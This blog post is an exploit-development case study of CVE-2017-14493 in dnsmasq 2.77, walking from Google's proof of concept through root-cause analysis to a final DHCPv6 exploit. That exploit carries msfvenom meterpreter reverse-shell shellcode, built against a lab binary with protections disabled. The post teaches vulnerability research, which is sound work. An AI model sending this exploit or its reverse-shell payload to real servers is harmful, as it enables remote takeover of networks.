---
layout: post
title: "Case Study CVE-2017-14493 Stack Base Overflow in dnsmasq 2.77"
date: 2023-06-13 10:09:00 -0500
categories: linux
tags: linux-exp-dev asm networking 
image:
  path: /assets/img/headers/dnsmasq/dnsmasq.jpg
---

## What is DNSmasq and for what is used?

Dnsmasq is flexible and lightweight DNS (Domain Name System) forwarder and DHCP (Dynamic Host Configuration Protocol) server software that combines important networking services into a single, efficient package. It works as a DNS router, a DHCP server, a network boot server, and even a TFTP server, giving it a wide range of features and functions that are important for managing networks well.

Dnsmasq's major job is to act as a DNS forwarder, which lets client devices translate domain names into IP addresses. It does this by keeping a local cache of DNS records, which makes less use of external DNS servers and improves the general performance of the network. The cache function of Dnsmasq speeds up the response time for subsequent DNS queries. This reduces latency and improves the efficiency of the network.

In addition to DNS forwarding, Dnsmasq offers DHCP services to dynamically give IP addresses, subnet masks, gateway addresses, and other network configuration parameters to client devices. By acting as a DHCP server, Dnsmasq makes network management easier by automating IP address management, getting rid of the need to give IP addresses by hand, and making it easier to control network connectivity from a central location.

**Note: This application is used by default in all Ubuntu Linux systems.**

## Study CVE-2017-14493 Stack Base Overflow in dnsmasq 2.77

Google researchers have discovered multiple vulnerabilities in dnsmasq, a widely used DNS forwarding and DHCP server software. The findings were detailed in an article titled "**Behind Masq: Yet More DNS and DHCP Software Flaws**" published on the Google Security Blog. These vulnerabilities, including the CVE-2017-14493 stack base overflow in dnsmasq version 2.77, expose systems to potential remote code execution and denial-of-service attacks. To learn more about the vulnerabilities identified by Google researchers, you can visit the full article at [https://security.googleblog.com/2017/10/behind-masq-yet-more-dns-and-dhcp.html](https://security.googleblog.com/2017/10/behind-masq-yet-more-dns-and-dhcp.html). It is crucial for users of dnsmasq 2.77 or earlier versions to take immediate action by applying patches or upgrading to patched versions to mitigate the risks associated with these vulnerabilities and ensure the security of their systems.

The PoC Provided by google can be found here [https://github.com/google/security-research-pocs/blob/master/vulnerabilities/dnsmasq/CVE-2017-14493.py](https://github.com/google/security-research-pocs/blob/master/vulnerabilities/dnsmasq/CVE-2017-14493.py). Let's test this script:
```python
#!/usr/bin/python
#
# Copyright 2017 Google Inc
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Authors:
#  Fermin J. Serna <fjserna@google.com>
#  Felix Wilhelm <fwilhelm@google.com>
#  Gabriel Campana <gbrl@google.com>
#  Kevin Hamacher <hamacher@google.com>
#  Gynvael Coldwind <gynvael@google.com>
#  Ron Bowes - Xoogler :/

from struct import pack
import sys
import socket

def send_packet(data, host, port):
    print("[+] sending {} bytes to {}:{}".format(len(data), host, port))
    s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, socket.IPPROTO_UDP)

    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, len(data))
    if s.sendto(data, (host, port)) != len(data):
        print("[!] Could not send (full) payload")
    s.close()

def u8(x):
    return pack("B", x)

def u16(x):
    return pack("!H", x)

def gen_option(option, data, length=None):
    if length is None:
        length = len(data)

    return b"".join([
        u16(option),
        u16(length),
        data
    ])

if __name__ == '__main__':
    assert len(sys.argv) == 3, "{} <ip> <port>".format(sys.argv[0])
    pkg = b"".join([
        u8(12),                         # DHCP6RELAYFORW
        u16(0x0313), u8(0x37),          # transaction ID
        b"_" * (34 - 4),
        # Option 79 = OPTION6_CLIENT_MAC
        # Moves argument into char[DHCP_CHADDR_MAX], DHCP_CHADDR_MAX = 16
        gen_option(79, b"A" * 74 + pack("<Q", 0x1337DEADBEEF)),
    ])

    host, port = sys.argv[1:]
    send_packet(pkg, host, int(port))
```

![dnsmasq](/assets/img/headers/dnsmasq/dnsmasq1.png)

Remember that this test was done without any protection.

## Prepare a Debug Environment and Investigate the ROOT Cause
### Debug Environment
First, we have to setup the right program and start compile from scratch. I made a little repository on my github with all you need to install this application. [https://github.com/T3jv1l/dnsmasq-2.77-POC](https://github.com/T3jv1l/dnsmasq-2.77-POC)  

- System require Ubuntu 18.04.6 LTS 

- Download the required dependency packages:
    - libllvm-3.9-ocaml-dev_3.9.1-5ubuntu1_amd64.deb
    - libllvm3.9_3.9.1-19ubuntu1_amd64.deb
    ```sh
    dpgk -i libllvm-3.9-ocaml-dev_3.9.1-5ubuntu1_amd64.deb
    dpgk -i libllvm3.9_3.9.1-19ubuntu1_amd64.deb
    ```
- Install additional dependencies:
    - To complete the installation process, you need to install several additional dependencies. 
    ```sh
    sudo apt-get install llvm-3.9-dev gcc make perl clang-3.9 clang-3.9-doc libclang-common-3.9-dev libclang-3.9-dev libclang1-3.9 libclang1-3.9-dbg libllvm3.9 libllvm3.9-dbg lldb-3.9 llvm-3.9 llvm-3.9-dev llvm-3.9-doc llvm-3.9-examples llvm-3.9-runtime clang-format-3.9 python-clang-3.9 libfuzzer-3.9-dev
    ```
- Install additional dependencies:
    - Once the installation process is complete, you can verify if the dependencies are successfully installed by running the following command:
    ```sh
    llvm-config-3.9 --version
    ```
- To further enhanc and stability of your dnsmasq installation, you can utilize additional environment variables. These variables help configure the build process with specific flags and options for AddressSanitizer, a powerful memory error detector and sanitizer tool (this help us to do debugg). 
```sh
export CFLAGS="-O1 -g -fsanitize=address,bool,float-cast-overflow,integer-divide-by-zero,return,returns-nonnull-attribute,shift-exponent,signed-integer-overflow,unreachable,vla-bound -fno-sanitize-recover=all -fno-omit-frame-pointer -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1"
export CXXFLAGS="-O1 -g -fsanitize=address,bool,float-cast-overflow,integer-divide-by-zero,return,returns-nonnull-attribute,shift-exponent,signed-integer-overflow,unreachable,vla-bound -fno-sanitize-recover=all -fno-omit-frame-pointer -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1"
export LDFLAGS="-g -fsanitize=address,bool,float-cast-overflow,integer-divide-by-zero,return,returns-nonnull-attribute,shift-exponent,signed-integer-overflow,unreachable,vla-bound"
export CC="/usr/bin/clang-3.9"
export CXX="/usr/bin/clang++-3.9"
export ASAN_OPTIONS="exitcode=1,handle_segv=1,detect_leaks=1,leak_check_at_exit=1,allocator_may_return_null=1,detect_odr_violation=0"
export ASAN_SYMBOLIZER_PATH="/usr/lib/llvm-3.9/bin/llvm-symbolizer"
```

To proceed with building our application, it is necessary to modify the flags in the Makefile to disable all the protection and generate the symbols for GDB line 27-27.
```sh
CFLAGS = -Wall -W -O0 -ggdb -fno-stack-protector
LDFLAGS = -z execstack -fno-stack-protector -no-pie
```
I made some bash scripting to modify the config of DNS to open and restart the DNSmasq applicatian also to attach in debugging mode. The script looks like this (this is not the best way to debugg an application, but for me it's works):

Start server `server.sh`:
```sh
#!/bin/bash

cat <<EOF > /etc/systemd/resolved.conf
#  This file is part of systemd.
#
#  systemd is free software; you can redistribute it and/or modify it
#  under the terms of the GNU Lesser General Public License as published by
#  the Free Software Foundation; either version 2.1 of the License, or
#  (at your option) any later version.
#
# Entries in this file show the compile time defaults.
# You can change settings by editing this file.
# Defaults can be restored by simply deleting this file.
#
# See resolved.conf(5) for details

[Resolve]
#DNS=
#FallbackDNS=
#Domains=
#LLMNR=no
#MulticastDNS=no
#DNSSEC=no
#Cache=yes
DNSStubListener=no
EOF

sudo systemctl daemon-reload
sudo systemctl restart systemd-resolved.service
sudo gdb --silent /home/hack/Desktop/dnsmasq/src/dnsmasq
```
Restore server `restore-server.sh`:
```sh
#!/bin/bash

cat <<EOF > /etc/systemd/resolved.conf
#  This file is part of systemd.
#
#  systemd is free software; you can redistribute it and/or modify it
#  under the terms of the GNU Lesser General Public License as published by
#  the Free Software Foundation; either version 2.1 of the License, or
#  (at your option) any later version.
#
# Entries in this file show the compile time defaults.
# You can change settings by editing this file.
# Defaults can be restored by simply deleting this file.
#
# See resolved.conf(5) for details

[Resolve]
#DNS=
#FallbackDNS=
#Domains=
#LLMNR=no
#MulticastDNS=no
#DNSSEC=no
#Cache=yes
#DNSStubListener=no
EOF

sudo systemctl daemon-reload
sudo systemctl restart systemd-resolved.service
```
###  Investigate the ROOT Cause
In the case of dnsmasq, investigating the root cause of an issue may involve studying error logs, examining relevant code sections, reviewing system configurations, analyzing network traffic, or leveraging debugging tools and techniques. This process helps in uncovering any software defects, misconfigurations, compatibility issues, or external factors that may be responsible for the observed behavior.

Using `server.sh` we start a gdb instance and we will run the DNSmasq application

![dnsmasq](/assets/img/headers/dnsmasq/dnsmasq2.png)

Edit the PoC to see where in code the application crash.
```python
#!/usr/bin/python

from struct import pack
import sys
import socket
import binascii

def send_packet(data, host, port):
    print("[+] sending {} bytes to {}:{}".format(len(data), host, port))
    s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, socket.IPPROTO_UDP)

    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, len(data))
    if s.sendto(data, (host, port)) != len(data):
        print("[!] Could not send (full) payload")
    s.close()

def u8(x):
    return pack("B", x)

def u16(x):
    return pack("!H", x)

def gen_option(option, data, length=None):
    if length is None:
        length = len(data)

    return b"".join([
        u16(option),
        u16(length),
        data
    ])

if __name__ == '__main__':
    assert len(sys.argv) == 3, "{} <ip> <port>".format(sys.argv[0])
    pkg = b"".join([
        u8(12),                         # DHCP6RELAYFORW
        u16(0x0313), u8(0x37),          # transaction ID
        b"_" * (34 - 4),
        # Option 79 = OPTION6_CLIENT_MAC
        # Moves argument into char[DHCP_CHADDR_MAX], DHCP_CHADDR_MAX = 16
        gen_option(79, b"A"*1000),
    ])

    print("[+] Packer Header (38 bytes):")
    print(binascii.hexlify(pkg)[0:76])
    host, port = sys.argv[1:]
    send_packet(pkg, host, int(port))
```

![dnsmasq](/assets/img/headers/dnsmasq/dnsmasq3.png)

Using the ggdb symbols we can see where the application stop at first crash.

![dnsmasq](/assets/img/headers/dnsmasq/dnsmasq4.png)

If you see the our exploit it's create a fake DHCP6RELAYFORW and a transaction ID to pass the execution. If you take a look inside the rfc3315.c at line 103-107 you can see what our exploit try to fake it.
```c
....
  if (dhcp6_maybe_relay(&state, daemon->dhcp_packet.iov_base, sz, client_addr, 
			IN6_IS_ADDR_MULTICAST(client_addr), now))
    return msg_type == DHCP6RELAYFORW ? DHCPV6_SERVER_PORT : DHCPV6_CLIENT_PORT;
...
```
The code snippet determines the return value of a function based on certain conditions. If the `dhcp6_maybe_relay()` function call returns true, the returned value depends on whether `msg_type` is equal to `DHCP6RELAYFORW`. 

Anothe important aspect is that we need a proper value for `DHCP6RELAYFORW` and for `OPTION6_CLIENT_MAC` this have a specific syscall, in our case can be found in dhcp6-protocol.h (If you want to know why we have these values in our exploit.)
```c
#define DHCP6RELAYFORW    12
#define OPTION6_CLIENT_MAC 79
```
After we pass the dhcp6_maybe_relay the true root cause is the `OPTION6_CLIENT_MAC` if you look down at line 207-212 we have the next snipped code.
```c
.....
  if ((opt = opt6_find(opts, end, OPTION6_CLIENT_MAC, 3)))
    {
      state->mac_type = opt6_uint(opt, 0, 2);
      state->mac_len = opt6_len(opt) - 2;
      memcpy(&state->mac[0], opt6_ptr(opt, 2), state->mac_len);
    }
......
```
The code checks for the presence of a DHCPv6 option with the code `OPTION6_CLIENT_MAC` and performs actions to extract and store relevant data from that option. The extracted information includes the mac_type, mac_len, and mac values, which are stored in the state structure or variables. But the `memcpy()` size is not correctly determined and this can lead into a code execution.

To summarize what `DHCP6RELAYFORW`, `OPTION6_CLIENT_MAC` and `Transaction ID` are:

- `DHCP6RELAYFORW` is a DHCPv6 (Dynamic Host Configuration Protocol for IPv6) name or constant. In DHCPv6, it refers to the "Relay-Forward" message type. The Relay-Forward message is used by DHCPv6 relay nodes to convey DHCPv6 messages from clients to servers in a network. 

- `OPTION6_CLIENT_MAC` refers to a DHCPv6 option named "Client MAC Address." Options in DHCPv6 allow clients, servers, and relay agents to provide and receive additional data or settings. The Client MAC Address option contains the MAC (Media Access Control) address of the DHCPv6 client, which is a unique identifier for the client's network equipment.

- The `Transaction ID`, is a unique number used in DHCP (both DHCPv4 and DHCPv6) to match client requests with server responses. When a client sends a DHCP request, it includes a transaction ID in the message. The server then use the same transaction ID in its response to ensure that the response corresponds to the correct client request.

## Smash the stack and Control Flow

Now, it's time for us to delve into the exciting realm of stack smashing and code execution. To accomplish this, we'll need to set a crucial breakpoint at line 210 in our code. But that's not all— we'll also create a unique pattern that allows us to pinpoint the exact offset of our application. Although the Google proof of concept (POC) presents this information, I want to take you through each step personally.
```python
#!/usr/bin/python

from struct import pack
import sys
import socket
import binascii

def send_packet(data, host, port):
    print("[+] sending {} bytes to {}:{}".format(len(data), host, port))
    s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, socket.IPPROTO_UDP)

    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, len(data))
    if s.sendto(data, (host, port)) != len(data):
        print("[!] Could not send (full) payload")
    s.close()

def u8(x):
    return pack("B", x)

def u16(x):
    return pack("!H", x)

def gen_option(option, data, length=None):
    if length is None:
        length = len(data)

    return b"".join([
        u16(option),
        u16(length),
        data
    ])

if __name__ == '__main__':
    assert len(sys.argv) == 3, "{} <ip> <port>".format(sys.argv[0])
    pkg = b"".join([
        u8(12),                         # DHCP6RELAYFORW
        u16(0x0313), u8(0x37),          # transaction ID
        b"_" * (34 - 4),
        # Option 79 = OPTION6_CLIENT_MAC
        # Moves argument into char[DHCP_CHADDR_MAX], DHCP_CHADDR_MAX = 16
        gen_option(79, b"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaae"),
    ])

    print("[+] Packer Header (38 bytes):")
    print(binascii.hexlify(pkg)[0:76])
    host, port = sys.argv[1:]
    send_packet(pkg, host, int(port))
```
With the breakpoint successfully set at line 210, we are now ready to run the script and begin our exploration. As the execution proceeds, the program will halt at the specified breakpoint, allowing us to examine the program's state and variables at that particular moment. This pause gives us an opportunity to analyze the code's behavior and make any necessary observations or modifications

![dnsmasq](/assets/img/headers/dnsmasq/dnsmasq5.png)

By utilizing the "next" (or "n") command in the GNU Debugger (gdb), we can closely monitor the program's execution, step by step.

![dnsmasq](/assets/img/headers/dnsmasq/dnsmasq6.png)

After analyzing the pattern we generated, we have determined that our offset is 50. With this knowledge in hand, we can now proceed to the next exciting step: attempting to control the execution flow of our application. By manipulating the stack and carefully crafting our input, we will strive to gain control over the program's behavior.

It's time to make further modifications to the proof of concept (POC).
```python
#!/usr/bin/python

from struct import pack
import sys
import socket
import binascii

def send_packet(data, host, port):
    print("[+] sending {} bytes to {}:{}".format(len(data), host, port))
    s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, socket.IPPROTO_UDP)

    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, len(data))
    if s.sendto(data, (host, port)) != len(data):
        print("[!] Could not send (full) payload")
    s.close()

def u8(x):
    return pack("B", x)

def u16(x):
    return pack("!H", x)

def gen_option(option, data, length=None):
    if length is None:
        length = len(data)

    return b"".join([
        u16(option),
        u16(length),
        data
    ])

if __name__ == '__main__':
    assert len(sys.argv) == 3, "{} <ip> <port>".format(sys.argv[0])
    pkg = b"".join([
        u8(12),                         # DHCP6RELAYFORW
        u16(0x0313), u8(0x37),          # transaction ID
        b"_" * (34 - 4),
        # Option 79 = OPTION6_CLIENT_MAC
        # Moves argument into char[DHCP_CHADDR_MAX], DHCP_CHADDR_MAX = 16
        gen_option(79, b"A"*50 + b"B"*8),
    ])

    print("[+] Packer Header (38 bytes):")
    print(binascii.hexlify(pkg)[0:76])
    host, port = sys.argv[1:]
    send_packet(pkg, host, int(port))
```
![dnsmasq](/assets/img/headers/dnsmasq/dnsmasq7.png)

Now, our next objective is to locate a suitable `jmp rsp` (jump to the value of the stack pointer) address. By finding this address, we can redirect the program's execution flow to our desired location. This is a crucial step in executing our shellcode successfully.

Once we have identified the appropriate `jmp rsp` address, we can proceed with injecting our crafted shellcode. The shellcode contains the specific instructions we want the program to execute, enabling us to achieve our desired actions, such as gaining remote access or performing specific tasks.

By carefully placing our shellcode within the program's memory space and redirecting the execution flow to it, we can trigger its execution.

![dnsmasq](/assets/img/headers/dnsmasq/dnsmasq8.png)

Final Proof of Concept.
```python
#!/usr/bin/python

from struct import pack
import sys
import socket
import binascii


#msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -b "\x00\x0a\x0d\x20" -f python

shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xef\xff\xff\xff\x48\x8d"
shellcode += b"\x05\xef\xff\xff\xff\x48\xbb\xf0\x69\x8f\x3d\xf0"
shellcode += b"\x76\x6b\x13\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
shellcode += b"\xff\xe2\xf4\xc1\x96\xe5\x34\xa8\xef\xdd\x03\xb8"
shellcode += b"\xe0\x59\x70\xc1\xbf\x01\x31\xb1\x33\xe5\x3a\xaa"
shellcode += b"\x79\x6e\x5b\x75\xa9\xf7\x6c\x9a\x7c\x2a\x4a\xa0"
shellcode += b"\x03\xa6\x65\x69\x1c\x69\x4c\x9a\x68\xd1\x32\xf5"
shellcode += b"\x3e\xee\xd3\x88\x52\xc7\xaa\xb8\xcf\x69\x13\xf5"
shellcode += b"\x50\xf0\x3d\xf0\x77\x3a\x5b\x79\x8f\xe5\x2d\xaa"
shellcode += b"\x1c\x41\x4b\xff\x6c\xd6\x75\x75\xb6\x12\x36\xb9"
shellcode += b"\x96\x46\x49\xe8\x21\x01\x30\xa8\x03\x8f\x57\xf5"
shellcode += b"\x3e\xe2\xf4\xb8\x58\x79\x32\xf5\x2f\x32\x4c\xb8"
shellcode += b"\xec\x4f\x44\x37\x1c\x57\x4b\x9a\x68\xd0\x32\xf5"
shellcode += b"\x28\x01\x6d\xaa\x66\x8a\x75\x75\xb6\x13\xfe\x0f"
shellcode += b"\x8f\x8f\x3d\xf0\x76\x6b\x13"


def send_packet(data, host, port):
    print("[+] sending {} bytes to {}:{}".format(len(data), host, port))
    s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, socket.IPPROTO_UDP)

    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, len(data))
    if s.sendto(data, (host, port)) != len(data):
        print("[!] Could not send (full) payload")
    s.close()

def u8(x):
    return pack("B", x)

def u16(x):
    return pack("!H", x)

def gen_option(option, data, length=None):
    if length is None:
        length = len(data)

    return b"".join([
        u16(option),
        u16(length),
        data
    ])

if __name__ == '__main__':
    assert len(sys.argv) == 3, "{} <ip> <port>".format(sys.argv[0])
    pkg = b"".join([
        u8(12),                         # DHCP6RELAYFORW
        u16(0x0313), u8(0x37),          # transaction ID
        b"_" * (34 - 4),
                                        # Option 79 = OPTION6_CLIENT_MAC
                                        # Moves argument into char[DHCP_CHADDR_MAX], DHCP_CHADDR_MAX = 16
        gen_option(79, b"A"*50 + pack("<Q",0x000000000045269f) + b"\x90" *16 + shellcode),
    ])

    print("[+] Packer Header (38 bytes):")
    print(binascii.hexlify(pkg)[0:76])
    host, port = sys.argv[1:]
    send_packet(pkg, host, int(port))
```
Below is the result of the proof of concept:

<video src="/assets/img/headers/dnsmasq/dnsmasq.mp4" controls="controls" style="max-width: 730px;">
</video>

## Reference

[https://security.googleblog.com/2017/10/behind-masq-yet-more-dns-and-dhcp.html](https://security.googleblog.com/2017/10/behind-masq-yet-more-dns-and-dhcp.html)

[https://www.arubanetworks.com/techdocs/Aruba_Fabric_Composer/Content/afc60olh/dhc-rel.htm](https://www.arubanetworks.com/techdocs/Aruba_Fabric_Composer/Content/afc60olh/dhc-rel.htm)

[https://www.elastic.co/guide/en/beats/packetbeat/current/exported-fields-dhcpv4.html](https://www.elastic.co/guide/en/beats/packetbeat/current/exported-fields-dhcpv4.html)

